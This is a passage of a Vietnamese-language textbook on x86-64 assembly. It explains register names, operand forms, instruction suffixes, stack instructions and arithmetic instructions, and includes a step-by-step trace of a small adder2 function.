<p>Thanh ghi <code>%rsp</code> và <code>%rbp</code> lần lượt được gọi là <strong>stack pointer</strong> (con trỏ stack) và <strong>frame pointer</strong> (hoặc <strong>base pointer</strong>). Compiler dành riêng các thanh ghi này cho các thao tác duy trì cấu trúc của <strong>program stack</strong> (ngăn xếp chương trình). Ví dụ, <code>%rsp</code> luôn trỏ tới đỉnh của stack. Trong các hệ thống x86 trước đây (ví dụ IA32), frame pointer thường theo dõi đáy của <strong>stack frame</strong> đang hoạt động và hỗ trợ tham chiếu các tham số. Tuy nhiên, trong các hệ thống x86-64, base pointer ít được sử dụng hơn. Compiler thường lưu 6 tham số đầu tiên của hàm vào các thanh ghi <code>%rdi</code>, <code>%rsi</code>, <code>%rdx</code>, <code>%rcx</code>, <code>%r8</code> và <code>%r9</code>. Thanh ghi <code>%rax</code> lưu giá trị trả về từ một hàm.</p>
<p>Thanh ghi cuối cùng đáng nhắc đến là <code>%rip</code> hay <strong>instruction pointer</strong> (đôi khi gọi là <strong>program counter</strong> — PC). Nó trỏ tới lệnh tiếp theo mà CPU sẽ thực thi. Không giống như 16 thanh ghi đã đề cập ở trên, chương trình không thể ghi trực tiếp vào <code>%rip</code>.</p>
<h3 id="712-cú-pháp-nâng-cao-của-thanh-ghi-advanced-register-notation"><a class="header" href="#712-cú-pháp-nâng-cao-của-thanh-ghi-advanced-register-notation">7.1.2. Cú pháp nâng cao của thanh ghi (Advanced Register Notation)</a></h3>
<p>Vì <strong>x86-64</strong> là phần mở rộng của kiến trúc x86 32-bit (vốn là phần mở rộng của phiên bản 16-bit trước đó), <strong>ISA</strong> (Instruction Set Architecture — kiến trúc tập lệnh) cung cấp cơ chế truy cập 32 bit thấp, 16 bit thấp và các byte thấp của mỗi thanh ghi. <strong>Bảng 1</strong> liệt kê 16 thanh ghi và ký hiệu trong ISA để truy cập các phần byte thành phần của chúng.</p>
<div class="table-wrapper"><table><thead><tr><th>64-bit Register</th><th>32-bit Register</th><th>Lower 16 Bits</th><th>Lower 8 Bits</th></tr></thead><tbody>
<tr><td><code>%rax</code></td><td><code>%eax</code></td><td><code>%ax</code></td><td><code>%al</code></td></tr>
<tr><td><code>%rbx</code></td><td><code>%ebx</code></td><td><code>%bx</code></td><td><code>%bl</code></td></tr>
<tr><td><code>%rcx</code></td><td><code>%ecx</code></td><td><code>%cx</code></td><td><code>%cl</code></td></tr>
<tr><td><code>%rdx</code></td><td><code>%edx</code></td><td><code>%dx</code></td><td><code>%dl</code></td></tr>
<tr><td><code>%rdi</code></td><td><code>%edi</code></td><td><code>%di</code></td><td><code>%dil</code></td></tr>
<tr><td><code>%rsi</code></td><td><code>%esi</code></td><td><code>%si</code></td><td><code>%sil</code></td></tr>
<tr><td><code>%rsp</code></td><td><code>%esp</code></td><td><code>%sp</code></td><td><code>%spl</code></td></tr>
<tr><td><code>%rbp</code></td><td><code>%ebp</code></td><td><code>%bp</code></td><td><code>%bpl</code></td></tr>
<tr><td><code>%r8</code></td><td><code>%r8d</code></td><td><code>%r8w</code></td><td><code>%r8b</code></td></tr>
<tr><td><code>%r9</code></td><td><code>%r9d</code></td><td><code>%r9w</code></td><td><code>%r9b</code></td></tr>
<tr><td><code>%r10</code></td><td><code>%r10d</code></td><td><code>%r10w</code></td><td><code>%r10b</code></td></tr>
<tr><td><code>%r11</code></td><td><code>%r11d</code></td><td><code>%r11w</code></td><td><code>%r11b</code></td></tr>
<tr><td><code>%r12</code></td><td><code>%r12d</code></td><td><code>%r12w</code></td><td><code>%r12b</code></td></tr>
<tr><td><code>%r13</code></td><td><code>%r13d</code></td><td><code>%r13w</code></td><td><code>%r13b</code></td></tr>
<tr><td><code>%r14</code></td><td><code>%r14d</code></td><td><code>%r14w</code></td><td><code>%r14b</code></td></tr>
<tr><td><code>%r15</code></td><td><code>%r15d</code></td><td><code>%r15w</code></td><td><code>%r15b</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các thanh ghi x86-64 và cơ chế truy cập các byte thấp.</p>
<p>Tám thanh ghi đầu tiên (<code>%rax</code>, <code>%rbx</code>, <code>%rcx</code>, <code>%rdx</code>, <code>%rdi</code>, <code>%rsi</code>, <code>%rsp</code>, và <code>%rbp</code>) là phần mở rộng 64-bit của các thanh ghi 32-bit trong x86 và có cơ chế chung để truy cập 32 bit thấp, 16 bit thấp và byte ít quan trọng nhất (least-significant byte). Để truy cập 32 bit thấp của tám thanh ghi này, chỉ cần thay chữ <code>r</code> trong tên thanh ghi bằng <code>e</code>. Ví dụ, thanh ghi tương ứng với 32 bit thấp của <code>%rax</code> là <code>%eax</code>. Để truy cập 16 bit thấp, sử dụng hai chữ cái cuối của tên thanh ghi. Do đó, cơ chế để truy cập hai byte thấp của <code>%rax</code> là <code>%ax</code>.</p>
<p><img src="C7-x86_64/_images/register.png" alt="Register %rax's names for accessing a subset of the register's bits. %eax refers to its lower 32 bits, %ax refers to its lower 16 bits, %al refers to the low-order byte (bits 0-7), and %ah refers to the second byte (bits 8-15)." /></p>
<p><strong>Hình 1.</strong> Các tên gọi tham chiếu đến các phần của thanh ghi <code>%rax</code>.</p>
<p>ISA cung cấp một cơ chế riêng để truy cập các thành phần 8-bit bên trong 16 bit thấp của bốn thanh ghi đầu tiên. <a href="C7-x86_64/basics.html#Register">Hình 1</a> minh họa cơ chế truy cập cho <code>%rax</code>. <strong>Higher byte</strong> (byte cao) và <strong>lower byte</strong> (byte thấp) trong 16 bit thấp của bốn thanh ghi đầu tiên có thể được truy cập bằng cách lấy hai chữ cái cuối của tên thanh ghi và thay chữ cái cuối bằng <code>h</code> (cho <em>higher</em>) hoặc <code>l</code> (cho <em>lower</em>), tùy thuộc vào byte muốn truy cập. Ví dụ, <code>%al</code> tham chiếu đến 8 bit thấp của <code>%ax</code>, trong khi <code>%ah</code> tham chiếu đến 8 bit cao của <code>%ax</code>. Các thanh ghi 8-bit này thường được dùng để lưu trữ giá trị 1 byte cho một số thao tác nhất định, chẳng hạn như <strong>bitwise shift</strong> (dịch bit), vì một thanh ghi 32-bit không thể dịch quá 32 vị trí, và số 32 chỉ cần 1 byte để lưu trữ.</p>
<blockquote>
<p><strong>Compiler có thể chọn component register tùy thuộc vào kiểu dữ liệu</strong><br />
Khi đọc code assembly, hãy nhớ rằng compiler thường sử dụng các thanh ghi 64-bit khi làm việc với giá trị 64-bit (ví dụ: con trỏ hoặc kiểu <code>long</code>) và sử dụng các <strong>component register</strong> 32-bit khi làm việc với giá trị 32-bit (ví dụ: kiểu <code>int</code>). Trong x86-64, việc thấy các component register 32-bit xen kẽ với các thanh ghi 64-bit đầy đủ là rất phổ biến.<br />
Ví dụ, trong hàm <code>adder2</code> ở ví dụ trước, compiler tham chiếu đến component register <code>%eax</code> thay vì <code>%rax</code> vì kiểu <code>int</code> thường chiếm 32 bit (4 byte) trên hệ thống 64-bit. Nếu hàm <code>adder2</code> có tham số kiểu <code>long</code> thay vì <code>int</code>, compiler sẽ lưu <code>a</code> trong thanh ghi <code>%rax</code> thay vì <code>%eax</code>.</p>
</blockquote>
<p>Tám thanh ghi cuối (<code>%r8</code>–<code>%r15</code>) không thuộc <strong>IA32 ISA</strong>. Tuy nhiên, chúng cũng có cơ chế để truy cập các thành phần byte khác nhau. Để truy cập 32 bit thấp, 16 bit thấp hoặc byte thấp nhất của tám thanh ghi này, lần lượt thêm các hậu tố <code>d</code>, <code>w</code> hoặc <code>b</code> vào cuối tên thanh ghi. Ví dụ, <code>%r9d</code> truy cập 32 bit thấp của <code>%r9</code>, <code>%r9w</code> truy cập 16 bit thấp, và <code>%r9b</code> truy cập byte thấp nhất của <code>%r9</code>.</p>
<h3 id="713-cấu-trúc-lệnh-instruction-structure"><a class="header" href="#713-cấu-trúc-lệnh-instruction-structure">7.1.3. Cấu trúc lệnh (Instruction Structure)</a></h3>
<p>Mỗi <strong>instruction</strong> (lệnh) bao gồm một <strong>operation code</strong> hay <strong>opcode</strong> (code thao tác) xác định lệnh đó làm gì, và một hoặc nhiều <strong>operand</strong> (toán hạng) cho biết lệnh sẽ thực hiện như thế nào.<br />
Ví dụ, lệnh <code>add $0x2, %eax</code> có opcode là <code>add</code> và các operand là <code>$0x2</code> và <code>%eax</code>.</p>
<p>Mỗi operand tương ứng với một vị trí nguồn hoặc đích cho một thao tác cụ thể. Các lệnh có hai toán hạng thường tuân theo định dạng <strong>source, destination</strong> (<code>S</code>, <code>D</code>), trong đó toán hạng đầu tiên chỉ nguồn (source register) và toán hạng thứ hai chỉ đích (destination).</p>
<p>Có nhiều loại operand:</p>
<ul>
<li><strong>Constant (literal)</strong>: giá trị hằng, được đặt trước dấu <code>$</code>. Ví dụ, trong lệnh <code>add $0x2, %eax</code>, <code>$0x2</code> là một giá trị hằng, tương ứng với giá trị hexa 0x2.</li>
<li><strong>Register</strong>: tham chiếu trực tiếp đến một thanh ghi. Ví dụ, lệnh <code>mov %rsp, %rbp</code> chỉ định rằng giá trị trong thanh ghi nguồn <code>%rsp</code> sẽ được sao chép vào thanh ghi đích <code>%rbp</code>.</li>
<li><strong>Memory</strong>: tham chiếu đến một giá trị trong bộ nhớ chính (RAM) và thường được dùng để tra cứu địa chỉ. Dạng địa chỉ bộ nhớ có thể chứa sự kết hợp giữa thanh ghi và giá trị hằng. Ví dụ, trong lệnh <code>mov -0x4(%rbp), %eax</code>, toán hạng <code>-0x4(%rbp)</code> là một dạng địa chỉ bộ nhớ. Nó có thể hiểu nôm na là “cộng -0x4 vào giá trị trong thanh ghi <code>%rbp</code> (tức là trừ 0x4 khỏi <code>%rbp</code>), sau đó thực hiện truy xuất bộ nhớ”. Nếu điều này nghe giống như <strong>pointer dereference</strong> (giải tham chiếu con trỏ), thì đúng là như vậy.</li>
</ul>
<h3 id="714-ví-dụ-với-các-toán-hạng-an-example-with-operands"><a class="header" href="#714-ví-dụ-với-các-toán-hạng-an-example-with-operands">7.1.4. Ví dụ với các toán hạng (An Example with Operands)</a></h3>
<p>Cách tốt nhất để giải thích chi tiết về operand là đưa ra một ví dụ nhanh.<br />
Giả sử bộ nhớ chứa các giá trị sau:</p>
<div class="table-wrapper"><table><thead><tr><th>Address</th><th>Value</th></tr></thead><tbody>
<tr><td>0x804</td><td>0xCA</td></tr>
<tr><td>0x808</td><td>0xFD</td></tr>
<tr><td>0x80c</td><td>0x12</td></tr>
<tr><td>0x810</td><td>0x1E</td></tr>
</tbody></table>
</div>
<p>Giả sử thêm rằng các thanh ghi sau chứa các giá trị như sau:</p>
<div class="table-wrapper"><table><thead><tr><th>Register</th><th>Value</th></tr></thead><tbody>
<tr><td>%rax</td><td>0x804</td></tr>
<tr><td>%rbx</td><td>0x10</td></tr>
<tr><td>%rcx</td><td>0x4</td></tr>
<tr><td>%rdx</td><td>0x1</td></tr>
</tbody></table>
</div>
<p>Khi đó, các operand trong <strong>Bảng 2</strong> sẽ được đánh giá thành các giá trị tương ứng. Mỗi hàng trong bảng khớp một operand với dạng của nó (ví dụ: constant, register, memory), cách nó được dịch, và giá trị của nó.<br />
Lưu ý rằng ký hiệu <code>M[x]</code> trong ngữ cảnh này biểu thị giá trị tại vị trí bộ nhớ có địa chỉ <code>x</code>.</p>
<div class="table-wrapper"><table><thead><tr><th>Operand</th><th>Form</th><th>Translation</th><th>Value</th></tr></thead><tbody>
<tr><td><code>%rcx</code></td><td>Register</td><td><code>%rcx</code></td><td>0x4</td></tr>
<tr><td><code>(%rax)</code></td><td>Memory</td><td>M[<code>%rax</code>] hoặc M[0x804]</td><td>0xCA</td></tr>
<tr><td><code>$0x808</code></td><td>Constant</td><td>0x808</td><td>0x808</td></tr>
<tr><td><code>0x808</code></td><td>Memory</td><td>M[0x808]</td><td>0xFD</td></tr>
<tr><td><code>0x8(%rax)</code></td><td>Memory</td><td>M[<code>%rax</code> + 8] hoặc M[0x80c]</td><td>0x12</td></tr>
<tr><td><code>(%rax, %rcx)</code></td><td>Memory</td><td>M[<code>%rax</code> + <code>%rcx</code>] hoặc M[0x808]</td><td>0xFD</td></tr>
<tr><td><code>0x4(%rax, %rcx)</code></td><td>Memory</td><td>M[<code>%rax</code> + <code>%rcx</code> + 4] hoặc M[0x80c]</td><td>0x12</td></tr>
<tr><td><code>0x800(,%rdx,4)</code></td><td>Memory</td><td>M[0x800 + <code>%rdx</code>×4] hoặc M[0x804]</td><td>0xCA</td></tr>
<tr><td><code>(%rax, %rdx, 8)</code></td><td>Memory</td><td>M[<code>%rax</code> + <code>%rdx</code>×8] hoặc M[0x80c]</td><td>0x12</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Ví dụ về các toán hạng (operands).</p>
<p>Trong <strong>Bảng 2</strong>, ký hiệu <code>%rcx</code> biểu thị giá trị được lưu trong thanh ghi <code>%rcx</code>. Ngược lại, M[<code>%rax</code>] biểu thị rằng giá trị bên trong <code>%rax</code> được coi là một địa chỉ, và cần <strong>dereference</strong> (giải tham chiếu) để lấy giá trị tại địa chỉ đó. Do đó, toán hạng <code>(%rax)</code> tương ứng với M[0x804], và giá trị tại địa chỉ này là 0xCA.</p>
<p>Một vài lưu ý quan trọng trước khi tiếp tục: mặc dù <strong>Bảng 2</strong> cho thấy nhiều dạng toán hạng hợp lệ, nhưng không phải tất cả các dạng đều có thể dùng thay thế cho nhau trong mọi trường hợp. Cụ thể:</p>
<ul>
<li>Dạng <strong>constant</strong> không thể được dùng làm toán hạng đích (destination operand).</li>
<li>Dạng <strong>memory</strong> không thể đồng thời là cả nguồn (source) và đích (destination) trong cùng một lệnh.</li>
<li>Trong các phép toán có <strong>scaling</strong> (tỉ lệ nhân — xem hai toán hạng cuối trong <a href="C7-x86_64/basics.html#Operands">Bảng 2</a>), hệ số nhân là tham số thứ ba trong dấu ngoặc. Hệ số nhân có thể là 1, 2, 4 hoặc 8.</li>
</ul>
<p><strong>Bảng 2</strong> được cung cấp để tham khảo; tuy nhiên, việc hiểu rõ các dạng toán hạng chính sẽ giúp người đọc tăng tốc độ phân tích code assembly.</p>
<h3 id="715-hậu-tố-của-lệnh-instruction-suffixes"><a class="header" href="#715-hậu-tố-của-lệnh-instruction-suffixes">7.1.5. Hậu tố của lệnh (Instruction Suffixes)</a></h3>
<p>Trong một số trường hợp ở các ví dụ tiếp theo, các lệnh thông dụng và lệnh số học có một <strong>suffix</strong> (hậu tố) cho biết <em>kích thước</em> (gắn liền với <em>kiểu dữ liệu</em>) của dữ liệu được thao tác ở mức code lệnh. Compiler sẽ tự động dịch code sang các lệnh có hậu tố phù hợp. <strong>Bảng 3</strong> cho thấy các hậu tố thông dụng của lệnh trong x86-64.</p>
<div class="table-wrapper"><table><thead><tr><th>Suffix</th><th>C Type</th><th>Size (bytes)</th></tr></thead><tbody>
<tr><td>b</td><td><code>char</code></td><td>1</td></tr>
<tr><td>w</td><td><code>short</code></td><td>2</td></tr>
<tr><td>l</td><td><code>int</code> hoặc <code>unsigned</code></td><td>4</td></tr>
<tr><td>s</td><td><code>float</code></td><td>4</td></tr>
<tr><td>q</td><td><code>long</code>, <code>unsigned long</code>, tất cả con trỏ</td><td>8</td></tr>
<tr><td>d</td><td><code>double</code></td><td>8</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Ví dụ về hậu tố của lệnh.</p>
<p>Lưu ý rằng các lệnh liên quan đến <strong>conditional execution</strong> (thực thi có điều kiện) sẽ có hậu tố khác nhau tùy thuộc vào điều kiện được đánh giá. Chúng ta sẽ tìm hiểu các lệnh liên quan đến thực thi có điều kiện trong <a href="C7-x86_64/conditional_control_loops.html#_conditional_control_and_loops">một phần sau</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="72-các-lệnh-thông-dụng-common-instructions"><a class="header" href="#72-các-lệnh-thông-dụng-common-instructions">7.2. Các lệnh thông dụng (Common Instructions)</a></h2>
<p>Trong phần này, chúng ta sẽ thảo luận về một số <strong>assembly instruction</strong> (lệnh assembly) thường gặp. <a href="C7-x86_64/common.html#Basic">Bảng 1</a> liệt kê những lệnh nền tảng nhất trong assembly x86 (và do đó cả x64).</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>mov S, D</code></td><td>S → D (sao chép giá trị của S vào D)</td></tr>
<tr><td><code>add S, D</code></td><td>S + D → D (cộng S vào D và lưu kết quả vào D)</td></tr>
<tr><td><code>sub S, D</code></td><td>D - S → D (trừ S <em>khỏi</em> D và lưu kết quả vào D)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh thông dụng nhất</p>
<p>Do đó, chuỗi lệnh:</p>
<pre><code>mov    -0x4(%rbp),%eax
add    $0x2,%eax
</code></pre>
<p>được dịch như sau:</p>
<ul>
<li>Sao chép giá trị tại vị trí <code>%rbp</code> + (-0x4) trong <strong>memory</strong> (M[<code>%rbp</code> - 0x4]) vào thanh ghi <code>%eax</code>.</li>
<li>Cộng giá trị <code>0x2</code> vào thanh ghi <code>%eax</code> và lưu kết quả vào <code>%eax</code>.</li>
</ul>
<p>Ba lệnh trong <strong>Bảng 1</strong> cũng tạo thành nền tảng cho các lệnh duy trì tổ chức của <strong>program stack</strong> (ngăn xếp chương trình, hay <strong>call stack</strong>). Hãy nhớ rằng các thanh ghi <code>%rbp</code> và <code>%rsp</code> lần lượt là <strong>frame pointer</strong> và <strong>stack pointer</strong>, được compiler dành riêng cho việc quản lý call stack. Như đã đề cập trong phần trước về <a href="C7-x86_64/../C2-C_depth/scope_memory.html#_parts_of_program_memory_and_scope">program memory</a>, call stack thường lưu trữ các biến cục bộ và tham số, đồng thời giúp chương trình theo dõi quá trình thực thi của chính nó (xem <a href="C7-x86_64/common.html#ProgramMemory">Hình 1</a>). Trên hệ thống x86-64, <strong>execution stack</strong> phát triển về phía các địa chỉ <em>thấp hơn</em>. Giống như mọi cấu trúc dữ liệu stack, các thao tác diễn ra ở “đỉnh” của stack.</p>
<p><img src="C7-x86_64/_images/memparts.png" alt="The parts of a program's address space." /></p>
<p><strong>Hình 1.</strong> Các phần của không gian địa chỉ của một chương trình</p>
<p><strong>x86-64 ISA</strong> cung cấp hai lệnh (Bảng 2) để đơn giản hóa việc quản lý call stack.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>push S</code></td><td>Đẩy một bản sao của S lên đỉnh stack. Tương đương với:  <code>sub $0x8, %rsp</code> và <code>mov S, (%rsp)</code></td></tr>
<tr><td><code>pop D</code></td><td>Lấy phần tử ở đỉnh stack ra và đặt vào vị trí D. Tương đương với: <code>mov (%rsp), D</code> và <code>add $0x8, %rsp</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Các lệnh quản lý stack</p>
<p>Lưu ý rằng trong khi ba lệnh ở <strong>Bảng 1</strong> yêu cầu hai toán hạng, thì <code>push</code> và <code>pop</code> trong <strong>Bảng 2</strong> chỉ yêu cầu một toán hạng.</p>
<h3 id="721-kết-hợp-tất-cả-một-ví-dụ-cụ-thể-hơn"><a class="header" href="#721-kết-hợp-tất-cả-một-ví-dụ-cụ-thể-hơn">7.2.1. Kết hợp tất cả: Một ví dụ cụ thể hơn</a></h3>
<p>Hãy xem kỹ hơn hàm <code>adder2</code>:</p>
<pre><code class="language-c">// adds two to an integer and returns the result
int adder2(int a) {
    return a + 2;
}
</code></pre>
<p>và code assembly tương ứng của nó:</p>
<pre><code>0000000000400526 &lt;adder2&gt;:
    400526:       55                      push   %rbp
    400527:       48 89 e5                mov    %rsp,%rbp
    40052a:       89 7d fc                mov    %edi,-0x4(%rbp)
    40052d:       8b 45 fc                mov    -0x4(%rbp),%eax
    400530:       83 c0 02                add    $0x2,%eax
    400533:       5d                      pop    %rbp
    400534:       c3                      retq
</code></pre>
<p>Mã assembly bao gồm một lệnh <code>push</code>, tiếp theo là ba lệnh <code>mov</code>, một lệnh <code>add</code>, một lệnh <code>pop</code> và cuối cùng là một lệnh <code>retq</code>.<br />
Để hiểu CPU thực thi tập lệnh này như thế nào, chúng ta cần xem lại cấu trúc của <a href="C7-x86_64/../C2-C_depth/scope_memory.html#_parts_of_program_memory_and_scope">program memory</a>.<br />
Hãy nhớ rằng mỗi khi một chương trình được thực thi, hệ điều hành sẽ cấp phát <strong>address space</strong> (không gian địa chỉ) mới cho chương trình đó (còn gọi là <strong>virtual memory</strong> — bộ nhớ ảo).<br />
Virtual memory và khái niệm liên quan là <a href="C7-x86_64/../C13-OS/processes.html#_processes">processes</a> sẽ được trình bày chi tiết hơn ở Chương 13; hiện tại, bạn chỉ cần hiểu rằng <strong>process</strong> là sự trừu tượng hóa của một chương trình đang chạy, và virtual memory là vùng bộ nhớ được cấp phát cho một process.<br />
Mỗi process có một vùng bộ nhớ riêng gọi là <strong>call stack</strong>. Lưu ý rằng call stack nằm trong process/virtual memory, khác với các thanh ghi (registers) vốn nằm trên CPU.</p>
<p><strong>Hình 2</strong> minh họa trạng thái mẫu của call stack và các thanh ghi trước khi thực thi hàm <code>adder2</code>.</p>
<p><img src="C7-x86_64/_images/ex1_1.png" alt="frame1" /></p>
<p><strong>Hình 2.</strong> Execution stack trước khi thực thi</p>
<p>Lưu ý rằng stack phát triển về phía các địa chỉ <em>thấp hơn</em>. Thanh ghi <code>%eax</code> chứa một giá trị rác. Tham số duy nhất của hàm <code>adder2</code> (<code>a</code>) theo quy ước được lưu trong thanh ghi <code>%rdi</code>. Vì <code>a</code> có kiểu <code>int</code>, nó được lưu trong <strong>component register</strong> <code>%edi</code> (như thể hiện trong Hình 2). Tương tự, vì hàm <code>adder2</code> trả về một giá trị <code>int</code>, nên <strong>component register</strong> <code>%eax</code> được dùng để chứa giá trị trả về thay vì <code>%rax</code>.</p>
<p>Các địa chỉ gắn với các lệnh trong <strong>code segment</strong> của program memory (0x400526–0x400534) đã được rút gọn thành (0x526–0x534) để hình minh họa dễ đọc hơn. Tương tự, các địa chỉ gắn với <strong>call stack segment</strong> đã được rút gọn thành 0xd28–0xd1c từ 0x7fffffffdd28 – 0x7fffffffdd1c. Thực tế, địa chỉ của call stack nằm ở vùng địa chỉ cao hơn nhiều so với địa chỉ của code segment.</p>
<p>Hãy chú ý đến giá trị ban đầu của các thanh ghi <code>%rsp</code> và <code>%rbp</code>: lần lượt là 0xd28 và 0xd40. Mũi tên đỏ (góc trên bên trái) trong các hình tiếp theo biểu thị trực quan lệnh đang được thực thi. Thanh ghi <code>%rip</code> (hay instruction pointer) cho biết lệnh tiếp theo sẽ được thực hiện. Ban đầu, <code>%rip</code> chứa địa chỉ 0x526, tương ứng với lệnh đầu tiên trong hàm <code>adder2</code>.</p>
<p><img src="C7-x86_64/_images/ex1_2.png" alt="frame2" /></p>
<p>Lệnh đầu tiên (<code>push %rbp</code>) đặt một bản sao giá trị trong <code>%rbp</code> (0xd40) lên đỉnh stack. Sau khi thực thi, <code>%rip</code> trỏ tới địa chỉ của lệnh tiếp theo (0x527). Lệnh <code>push</code> giảm giá trị stack pointer đi 8 (tức “mở rộng” stack thêm 8 byte), dẫn đến <code>%rsp</code> mới là 0xd20. Hãy nhớ rằng <code>push %rbp</code> tương đương với:</p>
<pre><code>sub $8, %rsp
mov %rbp, (%rsp)
</code></pre>
<p>Nói cách khác, trừ 8 khỏi stack pointer và đặt bản sao nội dung của <code>%rbp</code> vào vị trí được trỏ bởi <code>(%rsp)</code>.</p>
<p><img src="C7-x86_64/_images/ex1_3.png" alt="frame3" /></p>
<p>Hãy nhớ rằng cấu trúc của lệnh <code>mov</code> là <code>mov S, D</code>, trong đó S là nguồn (source) và D là đích (destination). Do đó, lệnh tiếp theo (<code>mov %rsp, %rbp</code>) cập nhật giá trị của <code>%rbp</code> thành 0xd20. <code>%rip</code> tăng lên để trỏ tới lệnh tiếp theo, 0x52a.</p>
<p><img src="C7-x86_64/_images/ex1_4.png" alt="frame4" /></p>
<p>Tiếp theo, <code>mov %edi, -0x4(%rbp)</code> được thực thi. Lệnh này phức tạp hơn một chút so với lệnh <code>mov</code> trước. Trước hết, hãy nhớ rằng tham số đầu tiên của một hàm được lưu trong <code>%rdi</code>. Vì <code>a</code> có kiểu <code>int</code>, compiler lưu nó trong <strong>component register</strong> <code>%edi</code>. Toán hạng <code>-0x4(%rbp)</code> tương ứng với M[<code>%rbp</code> - 0x4]. Vì <code>%rbp</code> chứa 0xd20, trừ đi 4 sẽ ra 0xd1c. Do đó, lệnh <code>mov</code> này sao chép giá trị của <code>%edi</code> (0x28) vào vị trí 0xd1c trên stack. <code>%rip</code> tăng lên 0x52d.</p>
<p>Lưu ý rằng việc lưu giá trị 0x28 này không ảnh hưởng đến <code>%rsp</code>. Vì vậy, “đỉnh” stack theo chương trình vẫn là địa chỉ 0xd20.</p>
<p><img src="C7-x86_64/_images/ex1_5.png" alt="frame5" /></p>
<p>Lệnh <code>mov</code> tiếp theo (<code>mov -0x4(%rbp), %eax</code>) sao chép giá trị tại vị trí 0xd1c trên stack (M[<code>%rbp</code> - 0x4] = 0x28) vào <code>%eax</code>. <code>%rip</code> tăng lên 0x530.</p>
<p><img src="C7-x86_64/_images/ex1_6.png" alt="frame6" /></p>
<p>Tiếp theo, <code>add $0x2, %eax</code> được thực thi. Hãy nhớ rằng <code>add S, D</code> sẽ tính S + D và lưu vào D. Do đó, <code>add $0x2, %eax</code> cộng hằng số 0x2 vào giá trị trong <code>%eax</code> (0x28), kết quả là 0x2A được lưu vào <code>%eax</code>. <code>%rip</code> tăng lên 0x533.</p>
<p><img src="C7-x86_64/_images/ex1_7.png" alt="frame7" /></p>
<p>Lệnh tiếp theo là <code>pop %rbp</code>. Lệnh này “pop” giá trị ở đỉnh stack và đặt vào <code>%rbp</code>. Lệnh này tương đương với:</p>
<pre><code>mov (%rsp), %rbp
add $8, %rsp
</code></pre>
<p>Vì đỉnh stack hiện tại là 0xd20 (<code>%rsp</code>), nên khi thực thi, giá trị tại M[0xd20] được sao chép vào <code>%rbp</code>, khiến <code>%rbp</code> trở lại 0xd40. Stack pointer tăng thêm 8 (vì stack thu nhỏ về phía địa chỉ cao hơn), nên <code>%rsp</code> trở lại 0xd28. <code>%rip</code> lúc này trỏ tới lệnh cuối cùng (0x534).</p>
<p>Lệnh cuối cùng là <code>retq</code>. Chúng ta sẽ nói kỹ hơn về <code>retq</code> khi bàn về lời gọi hàm, nhưng hiện tại chỉ cần biết rằng nó chuẩn bị call stack để trả về từ một hàm. Theo quy ước, <code>%rax</code> luôn chứa giá trị trả về (nếu có). Trong trường hợp này, vì <code>adder2</code> trả về <code>int</code>, giá trị trả về nằm trong <code>%eax</code> và là 0x2A (42).</p>
<p>Trước khi tiếp tục, hãy lưu ý rằng giá trị cuối cùng của <code>%rsp</code> và <code>%rbp</code> lần lượt là 0xd28 và 0xd40 — <strong>giống hệt</strong> khi hàm bắt đầu thực thi. Đây là hành vi bình thường và mong đợi của call stack: nó lưu trữ biến tạm và dữ liệu của mỗi hàm khi chạy, và khi hàm kết thúc, stack trở lại trạng thái trước khi hàm được gọi. Vì vậy, thường thấy hai lệnh sau ở đầu hàm:</p>
<pre><code>push %rbp
mov %rsp, %rbp
</code></pre>
<p>và hai lệnh sau ở cuối hàm:</p>
<pre><code>pop %rbp
retq
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="73-các-lệnh-số-học-arithmetic-instructions"><a class="header" href="#73-các-lệnh-số-học-arithmetic-instructions">7.3. Các lệnh số học (Arithmetic Instructions)</a></h2>
<p><strong>x86 ISA</strong> (Instruction Set Architecture — kiến trúc tập lệnh) triển khai một số <strong>instructions</strong> (lệnh) tương ứng với các phép toán số học được thực hiện bởi <strong>ALU</strong> (Arithmetic Logic Unit — đơn vị số học và logic). <strong>Bảng 1</strong> liệt kê một số lệnh số học thường gặp khi đọc code assembly.</p>
<div class="table-wrapper"><table><thead><tr><th>Instruction</th><th>Translation</th></tr></thead><tbody>
<tr><td><code>add S, D</code></td><td>S + D → D</td></tr>
<tr><td><code>sub S, D</code></td><td>D - S → D</td></tr>
<tr><td><code>inc D</code></td><td>D + 1 → D</td></tr>
<tr><td><code>dec D</code></td><td>D - 1 → D</td></tr>
<tr><td><code>neg D</code></td><td>-D → D</td></tr>
<tr><td><code>imul S, D</code></td><td>S × D → D</td></tr>
<tr><td><code>idiv S</code></td><td><code>%rax</code> / S: quotient → <code>%rax</code>, remainder → <code>%rdx</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các lệnh số học phổ biến.</p>
<p>Lệnh <code>add</code> và <code>sub</code> tương ứng với phép cộng và phép trừ, mỗi lệnh nhận hai <strong>operand</strong> (toán hạng). Ba lệnh tiếp theo là các lệnh thao tác trên một thanh ghi duy nhất, tương ứng với các phép <strong>increment</strong> (<code>x++</code>), <strong>decrement</strong> (<code>x--</code>) và <strong>negation</strong> (<code>-x</code>) trong C. Lệnh nhân (<code>imul</code>) hoạt động trên hai toán hạng và đặt kết quả vào toán hạng đích. Nếu kết quả cần nhiều hơn 64 bit để biểu diễn, giá trị sẽ bị cắt ngắn xuống 64 bit.</p>
<p>Lệnh chia (<code>idiv</code>) hoạt động hơi khác. Trước khi thực thi <code>idiv</code>, giả định rằng thanh ghi <code>%rax</code> chứa <strong>dividend</strong> (số bị chia). Gọi <code>idiv</code> với toán hạng S sẽ chia nội dung của <code>%rax</code> cho S, đặt <strong>quotient</strong> (thương) vào <code>%rax</code> và <strong>remainder</strong> (phần dư) vào <code>%rdx</code>.</p>
<h3 id="731-các-lệnh-dịch-bit-bit-shifting-instructions"><a class="header" href="#731-các-lệnh-dịch-bit-bit-shifting-instructions">7.3.1. Các lệnh dịch bit (Bit Shifting Instructions)</a></h3>
